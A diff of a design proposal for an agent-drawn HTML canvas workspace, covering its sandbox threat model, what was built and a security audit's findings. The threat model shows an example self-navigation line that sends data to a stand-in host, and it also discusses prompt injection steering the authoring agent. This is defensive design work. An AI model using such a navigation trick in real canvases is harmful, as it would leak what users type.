@@ -1,8 +1,8 @@
 # Proposal: the Present workspace (agent-drawn HTML canvases) and a Presenter agent
 
-Status: proposal, decisions taken with Jason on 2026-10-23 (section 10).
-Nothing here is built. The Slides work stays parked on its branches
-(section 9.1). This doc started as "`.canvas` files in /files"; after review
+Status: decisions taken with Jason on 2026-10-23 (section 10). P0 and P1
+are built on branches, not merged (section 12). The Slides work stays
+parked on its branches (section 9.1). This doc started as "`.canvas` files in /files"; after review
 it became a workspace of its own, Present, which also takes the place of
 the planned Slides workspace.
 
@@ -247,9 +247,18 @@ Reuse the app frame plumbing, minus the bridge:
   sandbox does not stop that. Only the item view and a share run it, one at
   a time; the sidecar render has a timeout.
 - **Fake UI / phishing inside the frame.** A canvas can draw a fake login
-  box. It cannot send what is typed anywhere (`connect-src`, `form-action`,
-  no popups, no top navigation). On shares, a host pill labels the page as
-  a shared canvas.
+  box. `connect-src`, `form-action`, no popups and no top navigation stop
+  the obvious ways out, but a sandboxed frame may always navigate ITSELF
+  (`location = 'https://elsewhere/?d=…'`), and no frame CSP directive
+  governs that (the P1 audit, HIGH-1). What stops it is the HOST page's
+  `frame-src`: the owner UI allows only itself, `blob:` and the brain, and
+  a navigation elsewhere is blocked before its request is sent (measured in
+  Chrome). Every page that frames a canvas must carry such a `frame-src`:
+  the P3 share page too. A canvas can still navigate its frame to the
+  brain's own origin. CanvasSandbox also takes the frame down on a second
+  load event, and the frame takes WebRTC away (its ICE traffic is outside
+  `connect-src`). On shares, a host pill labels the page as a shared
+  canvas.
 - **Prompt injection into the author.** A document the agent read can steer
   what it writes. The sandbox keeps the result inert (no network, no bridge,
   no cookies). The worst case is misleading content, as on a page today.
@@ -613,3 +622,53 @@ should land before or with P1.
 Each phase lands with an independent read-only security audit on a fixed
 commit, since this is the first feature that runs agent-written script in
 front of people.
+
+## 12. What P0 and P1 built, and where it differs
+
+Built on branches (not merged): the `present` node type and the `presents`
+sidecar (migrations 0330 and 0331), the content layer
+(`packages/content/src/presents.ts`), the routes under
+`server/web/app/api/presents/`, the frame document
+(`packages/share-ui/src/canvas-frame-html.ts`), the canvas runtime
+(`packages/app-build/src/canvas-runtime.ts`, served at `/canvas-runtime/`),
+`CanvasSandbox` (`packages/share-ui/src/canvas-sandbox.tsx`), and the owner
+UI's `/present` folder view and live view in the client repo.
+
+Where it differs from the sections above:
+
+- **P1 turns on less of the kind.** No public link, contact or peer share,
+  context ref or `.canvas` export yet (P3). The poster columns exist; the
+  poster itself is P2. The last ten versions are kept, with a list route;
+  restore is P2 (`present_restore`).
+- **The canvas ticket is the frame ticket marked `cv`,** not a new token
+  kind: the gate already admits a frame ticket on frame paths only, and each
+  verifier refuses the other's ticket, so a canvas ticket never opens an app
+  frame and an app ticket never opens a canvas.
+- **`frame-ancestors`** also names `http://127.0.0.1:*` and
+  `http://localhost:*`: the desktop app serves its renderer from 127.0.0.1
+  on a port it picks, and the detached dev frontend runs on localhost.
+- **Fonts, the share stylesheet and the runtime answer CORS `*`.** A font is
+  a CORS fetch and a sandboxed frame's origin is `null`, so without it every
+  face fell back to system fonts (mini-app frames had the same gap).
+- **`mantle-kit.css`** (section 6.3, item 3) is not built yet; the Tailwind
+  compile on save is.
+- **Three.js** ships with OrbitControls as a second module
+  (`three/addons/controls/OrbitControls.js`).
+- **Pinned versions** are at least two weeks old at build time: Konva
+  10.7.1, Motion 13.5.1 (not 14.x), Alpine.js 3.17.4.
+- **A new canvas** is indexed by the extractor's drain and sweep, as a new
+  drawing is; the quiet period applies to later text changes.
+
+**The P1 security audit** (independent, read only, on the brain commit
+d26d78f5a): ship with fixes. Fixed on the branch: the doctype strip and the
+text readers were backtracking regexes a hostile canvas could stall the
+server with (now linear scans, tested on hostile input); the canvas ticket
+lives 30 seconds (an app's 120) and the frame route has a per-address
+limit; the admin's frame read runs in the admin's own scope, as the
+member's does; WebRTC is removed in the frame and DNS prefetch is off; a
+canvas's own error text is labelled as such. Open for later: a canvas can
+navigate its frame to the brain's own origin, which carries the owner's
+cookie on a one-origin box (mini-app frames share this; a gate rule that
+refuses cookie auth on a cross-site iframe navigation would close both); a
+runaway canvas can freeze the owner UI in the desktop app unless sandboxed
+frames get their own process.
